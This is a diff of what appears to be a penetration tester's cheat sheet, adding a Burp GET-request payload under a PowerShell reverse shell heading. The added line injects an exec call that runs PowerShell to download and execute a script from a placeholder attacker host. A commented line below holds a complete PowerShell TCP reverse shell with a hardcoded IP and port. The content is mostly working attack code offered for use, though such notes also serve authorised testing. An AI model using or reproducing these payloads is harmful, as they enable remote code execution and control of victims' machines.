@@ -14,6 +14,8 @@ http://www.fuzzysecurity.com/tutorials/16.html
 http://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 
 Powershell-reverseshell:
+Burp involve powershell in GET request:
+%00{.exec |c:\Windows\SystemNative(VARIABLE, DEPENDE OF WIN VERSION)\WindowsPowershell\v1.0powershell.exe IEX(New-Object Net.WebClient).downloadString('http://attacker/nishangscript').}
 #A simple and small reverse shell. Options and help removed to save space.
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
 #$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
